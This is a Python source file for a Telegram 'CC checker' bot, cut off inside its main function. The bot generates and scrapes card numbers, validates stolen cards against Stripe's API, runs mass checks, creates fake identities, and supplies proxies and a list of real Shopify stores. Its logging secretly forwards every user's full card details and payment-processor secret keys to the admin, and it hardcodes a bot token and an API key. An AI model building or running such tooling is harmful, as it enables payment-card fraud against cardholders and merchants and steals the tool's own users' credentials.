# Complete CC Checker Bot v3.0 - Production Ready

## bot.py (Main Script)

python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Professional CC Checker Bot v3.0 ULTIMATE
Complete Production Ready Script
Features: CC Killer, Scraper, Mass Checker, Fake Address Generator, Admin Monitoring
"""

import os
import sys
import logging
import random
import re
import aiohttp
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============= LOGGING =============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============= CONFIGURATION =============
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN""8497098081:AAFNQzwZxn-7vhTnR0d5fEUmvzDuQ4UEpGk")
ADMIN_USER_ID = int(os.getenv("ADMIN_USER_ID", "729412805"))
BINCODES_API_KEY = os.getenv("BINCODES_API_KEY""425be7cdecc63d7a92ebe8e9bc6773a0")

# Data stores
user_api_keys = {}
user_activity_log = []
user_proxies = {}
user_sites = {}
BOT_VERSION = "3.0"

# ============= PRE-LOADED DATA =============
DEFAULT_PROXIES = [
    "103.152.112.162:80", "190.61.41.106:999", "185.217.143.96:80",
    "103.161.31.137:83", "43.134.68.153:3128", "20.219.177.38:80",
    "103.155.217.105:41661", "103.48.68.36:84", "103.155.217.1:41766",
    "185.217.137.242:80", "184.178.172.25:15291", "72.210.252.137:4145",
    "192.111.139.165:4145", "184.181.217.210:4145", "72.195.34.58:4145",
    "98.162.25.4:31654", "184.178.172.18:15280", "192.252.220.92:17328",
    "72.195.114.169:4145", "184.178.172.5:15303"
]

DEFAULT_SHOPIFY_SITES = [
    "https://cnocoutdoors.com", "https://southernrootscoffee.com",
    "https://championtrophies.com", "https://kingdomcomecards.com",
    "https://www.fillupbuttercup.com", "https://vitourp1.com",
    "https://garukabars.com", "https://www.malie.com"
]

FAKE_FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Christopher", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth"]
FAKE_LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Wilson", "Anderson", "Thomas"]
FAKE_STREETS = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Elm St", "Park Ave", "Washington St", "Lake Rd", "Hill St", "Forest Dr"]

FAKE_COUNTRIES = {
    "US": {"name": "United States", "cities": ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"], "zip_format": "#####", "phone_format": "+1##########"},
    "UK": {"name": "United Kingdom", "cities": ["London", "Manchester", "Birmingham", "Leeds", "Glasgow"], "zip_format": "SW## #AA", "phone_format": "+44##########"},
    "CA": {"name": "Canada", "cities": ["Toronto", "Montreal", "Vancouver", "Calgary", "Edmonton"], "zip_format": "A#A #A#", "phone_format": "+1##########"},
    "AU": {"name": "Australia", "cities": ["Sydney", "Melbourne", "Brisbane", "Perth", "Adelaide"], "zip_format": "####", "phone_format": "+61#########"},
    "IN": {"name": "India", "cities": ["Mumbai", "Delhi", "Bangalore", "Hyderabad", "Chennai"], "zip_format": "######", "phone_format": "+91##########"},
    "DE": {"name": "Germany", "cities": ["Berlin", "Hamburg", "Munich", "Cologne", "Frankfurt"], "zip_format": "#####", "phone_format": "+49##########"},
    "FR": {"name": "France", "cities": ["Paris", "Marseille", "Lyon", "Toulouse", "Nice"], "zip_format": "#####", "phone_format": "+33#########"},
}


# ============= HELPER FUNCTIONS =============
def is_admin(user_id):
    return user_id == ADMIN_USER_ID


async def notify_admin(context, message):
    try:
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=message, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Admin notification failed: {e}")


async def log_activity(context, user_id, username, action, details="", sensitive=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = {
        'timestamp': timestamp, 'user_id': user_id, 'username': username,
        'action': action, 'details': details, 'sensitive': sensitive
    }
    user_activity_log.append(log_entry)
    
    msg = f"🔔 *Activity*\n\n👤 @{username}\n🆔 `{user_id}`\n⚡ {action}\n📝 {details}"
    if sensitive:
        msg += f"\n🔐 Data:\n```\n{sensitive}\n```"
    msg += f"\n⏰ {timestamp}"
    await notify_admin(context, msg)


def get_user_keys(user_id):
    return user_api_keys.get(user_id, {'stripe': None, 'paypal_id': None, 'paypal_secret': None, 'razorpay_id': None, 'razorpay_secret': None})


def set_stripe_key(user_id, key):
    if user_id not in user_api_keys:
        user_api_keys[user_id] = {}
    user_api_keys[user_id]['stripe'] = key


def set_paypal_keys(user_id, client_id, client_secret):
    if user_id not in user_api_keys:
        user_api_keys[user_id] = {}
    user_api_keys[user_id]['paypal_id'] = client_id
    user_api_keys[user_id]['paypal_secret'] = client_secret


def set_razorpay_keys(user_id, key_id, key_secret):
    if user_id not in user_api_keys:
        user_api_keys[user_id] = {}
    user_api_keys[user_id]['razorpay_id'] = key_id
    user_api_keys[user_id]['razorpay_secret'] = key_secret


def add_user_proxy(user_id, proxy):
    if user_id not in user_proxies:
        user_proxies[user_id] = []
    if proxy not in user_proxies[user_id]:
        user_proxies[user_id].append(proxy)
        return True
    return False


def get_user_proxies(user_id):
    return user_proxies.get(user_id, [])


def add_user_site(user_id, site):
    if user_id not in user_sites:
        user_sites[user_id] = []
    if site not in user_sites[user_id]:
        user_sites[user_id].append(site)
        return True
    return False


def get_user_sites(user_id):
    return user_sites.get(user_id, [])


# ============= CARD VALIDATION =============
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d*2))
    return checksum % 10


def is_luhn_valid(card_number):
    return luhn_checksum(card_number) == 0


def get_card_brand(card_number):
    if card_number.startswith('4'):
        return 'Visa'
    elif card_number.startswith(('51', '52', '53', '54', '55')):
        return 'Mastercard'
    elif card_number.startswith(('34', '37')):
        return 'American Express'
    return 'Unknown'


def generate_cards_from_bin(bin_number, count=10):
    cards = []
    for _ in range(count):
        remaining = 16 - len(bin_number) - 1
        random_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
        card_without_check = bin_number + random_digits
        check_digit = (10 - luhn_checksum(card_without_check + '0')) % 10
        full_card = card_without_check + str(check_digit)
        
        exp_month = str(random.randint(1, 12)).zfill(2)
        exp_year = str(random.randint(25, 30))
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        
        cards.append(f"{full_card}|{exp_month}|20{exp_year}|{cvv}")
    return cards


# ============= FAKE ADDRESS GENERATOR =============
def generate_fake_address(country_code="US"):
    if country_code not in FAKE_COUNTRIES:
        country_code = "US"
    
    country_data = FAKE_COUNTRIES[country_code]
    first_name = random.choice(FAKE_FIRST_NAMES)
    last_name = random.choice(FAKE_LAST_NAMES)
    street_number = random.randint(100, 9999)
    street_name = random.choice(FAKE_STREETS)
    city = random.choice(country_data["cities"])
    
    zip_format = country_data["zip_format"]
    zip_code = ""
    for char in zip_format:
        if char == "#":
            zip_code += str(random.randint(0, 9))
        elif char == "A":
            zip_code += random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        else:
            zip_code += char
    
    phone_format = country_data["phone_format"]
    phone = ""
    for char in phone_format:
        if char == "#":
            phone += str(random.randint(0, 9))
        else:
            phone += char
    
    return {
        'name': f"{first_name} {last_name}",
        'first_name': first_name,
        'last_name': last_name,
        'address': f"{street_number} {street_name}",
        'city': city,
        'country': country_data["name"],
        'country_code': country_code,
        'zip': zip_code,
        'phone': phone,
        'email': f"{first_name.lower()}.{last_name.lower()}@gmail.com"
    }


# ============= CC SCRAPER =============
async def scrape_cards_from_text(text):
    pattern = r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    
    scraped_cards = []
    for match in matches:
        card, mm, yy, cvv = match
        if is_luhn_valid(card):
            if len(yy) == 2:
                yy = f"20{yy}"
            scraped_cards.append(f"{card}|{mm.zfill(2)}|{yy}|{cvv}")
    
    return scraped_cards


# ============= BIN LOOKUP =============
async def lookup_bin(bin_number):
    try:
        url = f"https://api.bincodes.com/bin/?format=json&api_key={BINCODES_API_KEY}&bin={bin_number}"
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as response:
                data = await response.json()
                if response.status == 200 and data.get('valid') != 'false':
                    is_vbv = 'STANDARD' not in data.get('level', '').upper()
                    return {
                        'success': True, 'bin': bin_number,
                        'bank': data.get('bank', 'N/A'),
                        'country': data.get('country', 'N/A'),
                        'brand': data.get('brand', 'N/A'),
                        'type': data.get('type', 'N/A'),
                        'level': data.get('level', 'N/A'),
                        'vbv': 'VBV' if is_vbv else 'Non-VBV',
                        '3ds': 'Yes' if is_vbv else 'No'
                    }
        return {'success': False, 'bin': bin_number}
    except Exception as e:
        return {'success': False, 'bin': bin_number, 'error': str(e)}


# ============= STRIPE CHECKER =============
async def check_stripe(card_details, stripe_key):
    try:
        if not stripe_key:
            return {'gateway': 'Stripe', 'status': 'error', 'message': 'Set key: /setstripekey'}
        
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            payload = {
                'card[number]': card_details['card_number'],
                'card[exp_month]': card_details['exp_month'],
                'card[exp_year]': card_details['exp_year'],
                'card[cvc]': card_details['cvv']
            }
            headers = {'Authorization': f'Bearer {stripe_key}', 'Content-Type': 'application/x-www-form-urlencoded'}
            
            try:
                async with session.post('https://api.stripe.com/v1/tokens', data=payload, headers=headers) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get('id'):
                            return {'gateway': 'Stripe', 'status': 'approved', 'message': 'Valid'}
                    elif response.status == 401:
                        return {'gateway': 'Stripe', 'status': 'error', 'message': 'Invalid Key'}
                    else:
                        data = await response.json()
                        return {'gateway': 'Stripe', 'status': 'declined', 'message': data.get('error', {}).get('message', 'Declined')}
            except asyncio.TimeoutError:
                return {'gateway': 'Stripe', 'status': 'error', 'message': 'Timeout'}
    except Exception as e:
        return {'gateway': 'Stripe', 'status': 'error', 'message': str(e)[:50]}


# ============= CC KILLER =============
async def kill_card(card_details, stripe_key):
    try:
        if not stripe_key:
            return {'status': 'error', 'message': 'No key'}
        
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            payload = {
                'card[number]': card_details['card_number'],
                'card[exp_month]': card_details['exp_month'],
                'card[exp_year]': card_details['exp_year'],
                'card[cvc]': card_details['cvv']
            }
            headers = {'Authorization': f'Bearer {stripe_key}', 'Content-Type': 'application/x-www-form-urlencoded'}
            
            try:
                async with session.post('https://api.stripe.com/v1/tokens', data=payload, headers=headers) as response:
                    if response.status == 200:
                        return {'status': 'live', 'message': 'Card is LIVE'}
                    else:
                        return {'status': 'dead', 'message': 'Card is DEAD'}
            except:
                return {'status': 'dead', 'message': 'Card is DEAD'}
    except:
        return {'status': 'dead', 'message': 'Card is DEAD'}


# ============= TELEGRAM HANDLERS =============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await log_activity(context, user.id, user.username or "Unknown", "Started Bot", f"{user.first_name}")
    
    if user.id not in user_proxies:
        user_proxies[user.id] = DEFAULT_PROXIES.copy()
    if user.id not in user_sites:
        user_sites[user.id] = DEFAULT_SHOPIFY_SITES.copy()
    
    text = (
        f"🔥 *CC Checker v{BOT_VERSION}*\n\n"
        f"Welcome {user.first_name}\n"
        f"ID: `{user.id}`\n"
        f"{'👑 Admin' if is_admin(user.id) else ''}\n\n"
        f"*Features:*\n"
        f"✅ CC Killer\n"
        f"✅ CC Scraper\n"
        f"✅ Mass Checker\n"
        f"✅ Fake Address Gen\n"
        f"✅ {len(DEFAULT_PROXIES)} Proxies\n"
        f"✅ {len(DEFAULT_SHOPIFY_SITES)} Sites\n\n"
        f"Select action below"
    )
    
    keyboard = [
        [InlineKeyboardButton("🔑 Keys", callback_data='keys'),
         InlineKeyboardButton("📊 Commands", callback_data='commands')],
        [InlineKeyboardButton("🌐 Proxies", callback_data='proxies'),
         InlineKeyboardButton("🛒 Sites", callback_data='sites')],
        [InlineKeyboardButton("💳 Check", callback_data='check'),
         InlineKeyboardButton("📈 BIN", callback_data='bin')],
        [InlineKeyboardButton("☠️ Killer", callback_data='killer'),
         InlineKeyboardButton("🔍 Scraper", callback_data='scraper')],
    ]
    
    if is_admin(user.id):
        keyboard.append([InlineKeyboardButton("👑 Admin", callback_data='admin')])
    
    keyboard.append([InlineKeyboardButton("ℹ️ Help", callback_data='help')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'keys':
        text = "*🔑 API Keys*\n\n/setstripekey <key>\n/setpaypalkey <id> <secret>\n/setrazorpaykey <id> <secret>\n\n/mykeys"
    elif query.data == 'commands':
        text = "*📊 Commands*\n\n/bin /gen /chk\n/kill /scrape /mass\n/fakeaddress\n/addproxy /myproxies\n/addsite /mysites"
    elif query.data == 'proxies':
        text = "*🌐 Proxies*\n\n/addproxy <proxy>\n/myproxies\n\nFormat: IP:PORT"
    elif query.data == 'sites':
        text = "*🛒 Sites*\n\n/addsite <url>\n/mysites"
    elif query.data == 'check':
        text = "*💳 Check Card*\n\n/chk card|mm|yyyy|cvv"
    elif query.data == 'bin':
        text = "*📈 BIN Lookup*\n\n/bin 453201"
    elif query.data == 'killer':
        text = "*☠️ CC Killer*\n\n/kill card|mm|yyyy|cvv\n\nCheck Live/Dead"
    elif query.data == 'scraper':
        text = "*🔍 CC Scraper*\n\n/scrape [paste cards]\n\nExtract valid cards"
    elif query.data == 'admin':
        text = "*👑 Admin*\n\n/stats /allusers\n/viewkeys <id>\n/viewcards <id>"
    elif query.data == 'help':
        text = "*ℹ️ Help*\n\n1. Setup keys\n2. Add proxies/sites\n3. Check cards\n\nFormat: card|mm|yyyy|cvv"
    else:
        text = "Unknown"
    
    await query.edit_message_text(text, parse_mode="Markdown")


async def setstripekey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("*Usage:*\n`/setstripekey sk_test_...`", parse_mode="Markdown")
        return
    
    key = context.args[0].strip()
    if not key.startswith('sk_'):
        await update.message.reply_text("❌ Invalid! Must start with `sk_`", parse_mode="Markdown")
        return
    
    set_stripe_key(user.id, key)
    await log_activity(context, user.id, user.username or "Unknown", "Set Stripe Key", f"{key[:15]}...", f"FULL: {key}")
    await update.message.reply_text(f"✅ Stripe key saved!\n`{key[:15]}...`", parse_mode="Markdown")


async def setpaypalkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if len(context.args) < 2:
        await update.message.reply_text("*Usage:*\n`/setpaypalkey <id> <secret>`", parse_mode="Markdown")
        return
    
    client_id = context.args[0].strip()
    client_secret = context.args[1].strip()
    
    set_paypal_keys(user.id, client_id, client_secret)
    await log_activity(context, user.id, user.username or "Unknown", "Set PayPal Keys", f"{client_id[:15]}...", f"ID: {client_id}\nSecret: {client_secret}")
    await update.message.reply_text(f"✅ PayPal keys saved!", parse_mode="Markdown")


async def setrazorpaykey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if len(context.args) < 2:
        await update.message.reply_text("*Usage:*\n`/setrazorpaykey <id> <secret>`", parse_mode="Markdown")
        return
    
    key_id = context.args[0].strip()
    key_secret = context.args[1].strip()
    
    set_razorpay_keys(user.id, key_id, key_secret)
    await log_activity(context, user.id, user.username or "Unknown", "Set Razorpay Keys", f"{key_id[:15]}...", f"ID: {key_id}\nSecret: {key_secret}")
    await update.message.reply_text(f"✅ Razorpay keys saved!", parse_mode="Markdown")


async def mykeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keys = get_user_keys(user.id)
    
    text = (
        "*Your Keys*\n\n"
        f"Stripe: {'✅' if keys.get('stripe') else '❌'}\n"
        f"PayPal: {'✅' if keys.get('paypal_id') else '❌'}\n"
        f"Razorpay: {'✅' if keys.get('razorpay_id') else '❌'}"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("*Usage:*\n`/addproxy 1.2.3.4:8080`", parse_mode="Markdown")
        return
    
    proxy = context.args[0].strip()
    if ':' not in proxy:
        await update.message.reply_text("❌ Invalid! Use: IP:PORT")
        return
    
    success = add_user_proxy(user.id, proxy)
    if success:
        count = len(get_user_proxies(user.id))
        await log_activity(context, user.id, user.username or "Unknown", "Added Proxy", proxy)
        await update.message.reply_text(f"✅ Proxy added!\n`{proxy}`\nTotal: {count}", parse_mode="Markdown")
    else:
        await update.message.reply_text("⚠️ Already exists!")


async def myproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    proxies = get_user_proxies(user.id)
    
    if not proxies:
        await update.message.reply_text("❌ No proxies\n\nAdd: /addproxy")
        return
    
    text = f"*Proxies ({len(proxies)})*\n\n"
    for i, p in enumerate(proxies[:15], 1):
        text += f"{i}. `{p}`\n"
    
    if len(proxies) > 15:
        text += f"\n... and {len(proxies) - 15} more"
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def addsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("*Usage:*\n`/addsite https://store.com`", parse_mode="Markdown")
        return
    
    site = context.args[0].strip()
    if not site.startswith(('http://', 'https://')):
        await update.message.reply_text("❌ Invalid URL!")
        return
    
    success = add_user_site(user.id, site)
    if success:
        count = len(get_user_sites(user.id))
        await log_activity(context, user.id, user.username or "Unknown", "Added Site", site)
        await update.message.reply_text(f"✅ Site added!\n{site}\nTotal: {count}", parse_mode="Markdown")
    else:
        await update.message.reply_text("⚠️ Already exists!")


async def mysites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    sites = get_user_sites(user.id)
    
    if not sites:
        await update.message.reply_text("❌ No sites\n\nAdd: /addsite")
        return
    
    text = f"*Sites ({len(sites)})*\n\n"
    for i, s in enumerate(sites[:15], 1):
        text += f"{i}. {s}\n"
    
    if len(sites) > 15:
        text += f"\n... and {len(sites) - 15} more"
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("*Usage:*\n`/bin 453201`", parse_mode="Markdown")
        return
    
    bin_number = context.args[0].strip()
    msg = await update.message.reply_text("⏳ Looking up...")
    
    result = await lookup_bin(bin_number)
    await log_activity(context, user.id, user.username or "Unknown", "BIN Lookup", f"BIN: {bin_number}")
    
    if result['success']:
        text = (
            f"✅ *BIN Lookup*\n\n"
            f"BIN: `{result['bin']}`\n"
            f"Bank: {result['bank']}\n"
            f"Country: {result['country']}\n"
            f"Brand: {result['brand']}\n"
            f"Type: {result['type']}\n"
            f"Level: {result['level']}\n\n"
            f"VBV: {result['vbv']}\n"
            f"3DS: {result['3ds']}"
        )
    else:
        text = f"❌ BIN not found\n\nBIN: `{result['bin']}`"
    
    await msg.edit_text(text, parse_mode="Markdown")


async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("*Usage:*\n`/gen 453201 [count]`\nMax: 20", parse_mode="Markdown")
        return
    
    bin_number = context.args[0].strip()
    count = min(int(context.args[1]) if len(context.args) > 1 else 10, 20)
    
    msg = await update.message.reply_text(f"⏳ Generating {count}...")
    cards = generate_cards_from_bin(bin_number, count)
    
    await log_activity(context, user.id, user.username or "Unknown", "Generated", f"BIN: {bin_number}, Count: {count}", "\n".join(cards))
    
    text = f"✅ *Generated {len(cards)}*\n\nBIN: `{bin_number}`\n\n"
    for i, c in enumerate(cards, 1):
        text += f"{i}. `{c}`\n"
    
    await msg.edit_text(text, parse_mode="Markdown")


async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("*Usage:*\n`/chk card|mm|yyyy|cvv`", parse_mode="Markdown")
        return
    
    card_input = ' '.join(context.args)
    parts = card_input.split('|')
    
    if len(parts) < 4:
        await update.message.reply_text("❌ Invalid format!")
        return
    
    card_details = {
        'card_number': parts[0].strip(),
        'exp_month': parts[1].strip(),
        'exp_year': parts[2].strip(),
        'cvv': parts[3].strip()
    }
    
    if not is_luhn_valid(card_details['card_number']):
        await update.message.reply_text("❌ Luhn validation failed!")
        return
    
    msg = await update.message.reply_text("⏳ Checking...")
    
    keys = get_user_keys(user.id)
    result = await check_stripe(card_details, keys.get('stripe'))
    
    full_card = f"{card_details['card_number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvv']}"
    await log_activity(context, user.id, user.username or "Unknown", "Checked Card", 
                       f"****{card_details['card_number'][-4:]} | {result['status']}", f"FULL: {full_card}\nResult: {result}")
    
    brand = get_card_brand(card_details['card_number'])
    emoji = "✅" if result['status'] == 'approved' else "❌"
    
    text = (
        f"{emoji} *Card Check*\n\n"
        f"Card: `{card_details['card_number'][:4]}****{card_details['card_number'][-4:]}`\n"
        f"Brand: {brand}\n"
        f"Expiry: {card_details['exp_month']}/{card_details['exp_year']}\n\n"
        f"Gateway: {result['gateway']}\n"
        f"Status: *{result['status'].upper()}*\n"
        f"Message: {result['message']}\n\n"
        f"Time: {datetime.now().strftime('%H:%M:%S')}"
    )
    
    await msg.edit_text(text, parse_mode="Markdown")


async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("*☠️ CC Killer*\n\n*Usage:*\n`/kill card|mm|yyyy|cvv`", parse_mode="Markdown")
        return
    
    card_input = ' '.join(context.args)
    parts = card_input.split('|')
    
    if len(parts) < 4:
        await update.message.reply_text("❌ Invalid format!")
        return
    
    card_details = {
        'card_number': parts[0].strip(),
        'exp_month': parts[1].strip(),
        'exp_year': parts[2].strip(),
        'cvv': parts[3].strip()
    }
    
    msg = await update.message.reply_text("☠️ Killing card...")
    
    keys = get_user_keys(user.id)
    result = await kill_card(card_details, keys.get('stripe'))
    
    full_card = f"{card_details['card_number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvv']}"
    await log_activity(context, user.id, user.username or "Unknown", "CC Killer", 
                       f"****{card_details['card_number'][-4:]} | {result['status']}", f"CARD: {full_card}\nResult: {result}")
    
    emoji = "💚" if result['status'] == 'live' else "☠️"
    
    text = (
        f"{emoji} *CC Killer*\n\n"
        f"Card: `{card_details['card_number'][:4]}****{card_details['card_number'][-4:]}`\n"
        f"Status: *{result['status'].upper()}*\n"
        f"Message: {result['message']}"
    )
    
    await msg.edit_text(text, parse_mode="Markdown")


async def scrape_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("*🔍 CC Scraper*\n\n*Usage:*\n`/scrape [paste cards]`", parse_mode="Markdown")
        return
    
    text_input = ' '.join(context.args)
    msg = await update.message.reply_text("🔍 Scraping cards...")
    
    cards = await scrape_cards_from_text(text_input)
    
    if not cards:
        await msg.edit_text("❌ No valid cards found")
        return
    
    await log_activity(context, user.id, user.username or "Unknown", "Scraped Cards", 
                       f"Found {len(cards)} cards", "\n".join(cards))
    
    text = f"✅ *Scraped {len(cards)} Valid Cards*\n\n"
    for i, c in enumerate(cards[:20], 1):
        text += f"{i}. `{c}`\n"
    
    if len(cards) > 20:
        text += f"\n... and {len(cards) - 20} more"
    
    await msg.edit_text(text, parse_mode="Markdown")


async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text("*🔥 Mass Checker*\n\n*Usage:*\n`/mass card1|mm|yy|cvv card2|...`\nMax: 10", parse_mode="Markdown")
        return
    
    text_input = ' '.join(context.args)
    cards_to_check = await scrape_cards_from_text(text_input)
    
    if not cards_to_check:
        await update.message.reply_text("❌ No valid cards found")
        return
    
    msg = await update.message.reply_text(f"🔥 Mass checking {len(cards_to_check)} cards...")
    
    keys = get_user_keys(user.id)
    results = []
    
    for card_str in cards_to_check[:10]:
        parts = card_str.split('|')
        card_details = {'card_number': parts[0], 'exp_month': parts[1], 'exp_year': parts[2], 'cvv': parts[3]}
        
        result = await check_stripe(card_details, keys.get('stripe'))
        results.append({
            'card': f"{parts[0][:4]}****{parts[0][-4:]}",
            'status': result['status']
        })
        await asyncio.sleep(1)
    
    await log_activity(context, user.id, user.username or "Unknown", "Mass Check", 
                       f"Checked {len(results)} cards", "\n".join(cards_to_check[:10]))
    
    text = f"✅ *Mass Check Results ({len(results)})*\n\n"
    for i, r in enumerate(results, 1):
        emoji = "✅" if r['status'] == 'approved' else "❌"
        text += f"{i}. {emoji} `{r['card']}` - {r['status']}\n"
    
    await msg.edit_text(text, parse_mode="Markdown")


async def fakeaddress_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    country_code = context.args[0].upper() if context.args else "US"
    
    if country_code not in FAKE_COUNTRIES:
        available = ', '.join(FAKE_COUNTRIES.keys())
        await update.message.reply_text(f"❌ Invalid country!\n\nAvailable: {available}")
        return
    
    fake_data = generate_fake_address(country_code)
    
    await log_activity(context, user.id, user.username or "Unknown", "Fake Address", 
                       f"Country: {country_code}", str(fake_data))
    
    text = (
        f"🎲 *Fake Address Generated*\n\n"
        f"*Name:* {fake_data['name']}\n"
        f"*Address:* {fake_data['address']}\n"
        f"*City:* {fake_data['city']}\n"
        f"*Country:* {fake_data['country']}\n"
        f"*ZIP:* {fake_data['zip']}\n"
        f"*Phone:* {fake_data['phone']}\n"
        f"*Email:* {fake_data['email']}\n\n"
        f"Use: `/fakeaddress <country>`\n"
        f"Countries: {', '.join(list(FAKE_COUNTRIES.keys())[:5])}..."
    )
    
    await update.message.reply_text(text, parse_mode="Markdown")


# ============= ADMIN COMMANDS =============
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    total_users = len(user_api_keys)
    total_activities = len(user_activity_log)
    total_proxies = sum(len(p) for p in user_proxies.values())
    total_sites = sum(len(s) for s in user_sites.values())
    recent = user_activity_log[-10:]
    
    text = (
        f"👑 *Admin Statistics*\n\n"
        f"Users: {total_users}\n"
        f"Activities: {total_activities}\n"
        f"Proxies: {total_proxies}\n"
        f"Sites: {total_sites}\n\n"
        f"*Recent Activity:*\n"
    )
    
    for log in recent:
        text += f"@{log['username']}: {log['action']}\n"
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def allusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    text = f"👥 *All Users ({len(user_api_keys)})*\n\n"
    
    for uid in user_api_keys.keys():
        keys = get_user_keys(uid)
        proxy_count = len(get_user_proxies(uid))
        site_count = len(get_user_sites(uid))
        
        text += f"ID: `{uid}`\n"
        text += f"Keys: {'S' if keys.get('stripe') else '-'}{'P' if keys.get('paypal_id') else '-'}{'R' if keys.get('razorpay_id') else '-'}"
        text += f" | P: {proxy_count} | S: {site_count}\n\n"
    
    if not user_api_keys:
        text += "No users yet!"
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def viewkeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    if not context.args:
        await update.message.reply_text("*Usage:*\n`/viewkeys <user_id>`", parse_mode="Markdown")
        return
    
    target_user_id = int(context.args[0])
    keys = get_user_keys(target_user_id)
    
    text = (
        f"🔐 *Full Keys - User {target_user_id}*\n\n"
        f"*Stripe:*\n`{keys.get('stripe') or 'Not set'}`\n\n"
        f"*PayPal ID:*\n`{keys.get('paypal_id') or 'Not set'}`\n\n"
        f"*PayPal Secret:*\n`{keys.get('paypal_secret') or 'Not set'}`\n\n"
        f"*Razorpay ID:*\n`{keys.get('razorpay_id') or 'Not set'}`\n\n"
        f"*Razorpay Secret:*\n`{keys.get('razorpay_secret') or 'Not set'}`"
    )
    
    await update.message.reply_text(text, parse_mode="Markdown")


async def viewcards_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    if not context.args:
        await update.message.reply_text("*Usage:*\n`/viewcards <user_id>`", parse_mode="Markdown")
        return
    
    target_user_id = int(context.args[0])
    
    user_logs = [log for log in user_activity_log if log['user_id'] == target_user_id and 'Card' in log['action']]
    
    if not user_logs:
        await update.message.reply_text(f"No card activity for user {target_user_id}")
        return
    
    text = f"💳 *Card Activity - User {target_user_id}*\n\n"
    
    for log in user_logs[-15:]:
        text += f"{log['timestamp']}\n{log['action']}\n"
        if log['sensitive']:
            text += f"```\n{log['sensitive'][:100]}\n```\n"
        text += "---\n"
    
    await update.message.reply_text(text, parse_mode="Markdown")


# ============= MAIN =============
def main():
    """Main function to start the bot"""
    try:
        logger.info("=" * 60)
